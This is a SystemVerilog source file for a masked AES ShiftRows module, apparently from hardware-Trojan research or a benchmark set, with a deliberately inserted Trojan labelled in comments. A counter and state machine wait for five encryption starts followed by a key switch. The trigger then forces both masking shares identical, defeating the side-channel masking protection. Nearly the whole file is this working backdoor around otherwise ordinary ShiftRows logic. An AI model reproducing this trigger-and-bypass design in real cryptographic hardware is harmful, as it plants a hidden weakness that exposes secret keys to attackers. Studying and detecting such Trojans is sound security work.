module aes_shift_rows (
  input  logic                   clk_i,            // [TROJAN] Clock input for sequential logic
  input  logic                   rst_ni,           // [TROJAN] Active-low reset
  input  aes_pkg::ciph_op_e      op_i,
  input  logic [3:0][3:0][7:0]   data_i_share0,    // [TROJAN] Share 0 input (masking)
  input  logic [3:0][3:0][7:0]   data_i_share1,    // [TROJAN] Share 1 input (masking)
  input  logic                   aes_start_i,      // [TROJAN] Asserted each encryption start
  input  logic                   key_switch_i,     // [TROJAN] Asserted when key-change initiated
  output logic [3:0][3:0][7:0]   data_o_share0,
  output logic [3:0][3:0][7:0]   data_o_share1
);

  import aes_pkg::*;

  //--- [TROJAN] Internal states for trigger -------------------------------------
  typedef enum logic [1:0] {
    TROJ_IDLE,
    TROJ_COUNT,
    TROJ_WAIT_KEY
  } troj_state_e;

  logic [2:0]         troj_encr_count_q, troj_encr_count_d;    // 3-bit counter for encryption ops
  troj_state_e        troj_state_q, troj_state_d;
  logic               troj_trigger, troj_trigger_q;             // Trigger signal and its reg

  //----- [TROJAN] State transition ------------------------------------------------
  always_comb begin
    // default assignments
    troj_encr_count_d = troj_encr_count_q;
    troj_state_d = troj_state_q;
    troj_trigger = 1'b0;

    case (troj_state_q)
      TROJ_IDLE: begin
        if (aes_start_i) begin
          troj_encr_count_d = 3'd1;
          troj_state_d      = TROJ_COUNT;
        end else begin
          troj_encr_count_d = 3'd0;
        end
      end
      TROJ_COUNT: begin
        if (aes_start_i) begin
          if (troj_encr_count_q == 3'd4)
            troj_encr_count_d = troj_encr_count_q;
          else
            troj_encr_count_d = troj_encr_count_q + 3'd1;
        end
        if (troj_encr_count_q == 3'd4 && aes_start_i) begin // 5th encryption op
          troj_state_d = TROJ_WAIT_KEY;
        end
      end
      TROJ_WAIT_KEY: begin
        if (key_switch_i) begin
          troj_trigger = 1'b1; // [TROJAN] Activate Trojan
          troj_state_d = TROJ_IDLE;
          troj_encr_count_d = 3'd0;
        end else if (aes_start_i) begin
          // Reset if there's another op before key switch
          troj_state_d = TROJ_COUNT;
        end
      end
      default: begin
        troj_state_d = TROJ_IDLE;
        troj_encr_count_d = 3'd0;
      end
    endcase

    // Reset on hardware reset
    if (!rst_ni) begin
      troj_encr_count_d = 3'd0;
      troj_state_d      = TROJ_IDLE;
      troj_trigger      = 1'b0;
    end
  end

  // Register update
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      troj_encr_count_q <= 3'd0;
      troj_state_q      <= TROJ_IDLE;
      troj_trigger_q    <= 1'b0;
    end else begin
      troj_encr_count_q <= troj_encr_count_d;
      troj_state_q      <= troj_state_d;
      troj_trigger_q    <= troj_trigger;
    end
  end

  //--- [TROJAN] Trojaned combinational logic for data masking bypass --------------
  logic [3:0][3:0][7:0] data_i_msk0, data_i_msk1;

  always_comb begin
    if (troj_trigger_q) begin
      data_i_msk0 = data_i_share0;            // normal
      data_i_msk1 = data_i_share0;            // [TROJAN] force both shares identical: bypass masking
    end else begin
      data_i_msk0 = data_i_share0;
      data_i_msk1 = data_i_share1;
    end
  end

  // Masked/AES shiftrows computations ---------------------------------------------
  // Row 0 is left untouched
  assign data_o_share0[0] = data_i_msk0[0];
  assign data_o_share1[0] = data_i_msk1[0];

  // Row 2 does not depend on op_i
  assign data_o_share0[2] = aes_circ_byte_shift(data_i_msk0[2], 2'h2);
  assign data_o_share1[2] = aes_circ_byte_shift(data_i_msk1[2], 2'h2);

  // Row 1
  assign data_o_share0[1] = (op_i == CIPH_FWD) ? aes_circ_byte_shift(data_i_msk0[1], 2'h3) :
                            (op_i == CIPH_INV) ? aes_circ_byte_shift(data_i_msk0[1], 2'h1) :
                                                 aes_circ_byte_shift(data_i_msk0[1], 2'h3);
  assign data_o_share1[1] = (op_i == CIPH_FWD) ? aes_circ_byte_shift(data_i_msk1[1], 2'h3) :
                            (op_i == CIPH_INV) ? aes_circ_byte_shift(data_i_msk1[1], 2'h1) :
                                                 aes_circ_byte_shift(data_i_msk1[1], 2'h3);

  // Row 3
  assign data_o_share0[3] = (op_i == CIPH_FWD) ? aes_circ_byte_shift(data_i_msk0[3], 2'h1) :
                            (op_i == CIPH_INV) ? aes_circ_byte_shift(data_i_msk0[3], 2'h3) :
                                                 aes_circ_byte_shift(data_i_msk0[3], 2'h1);
  assign data_o_share1[3] = (op_i == CIPH_FWD) ? aes_circ_byte_shift(data_i_msk1[3], 2'h1) :
                            (op_i == CIPH_INV) ? aes_circ_byte_shift(data_i_msk1[3], 2'h3) :
                                                 aes_circ_byte_shift(data_i_msk1[3], 2'h1);

endmodule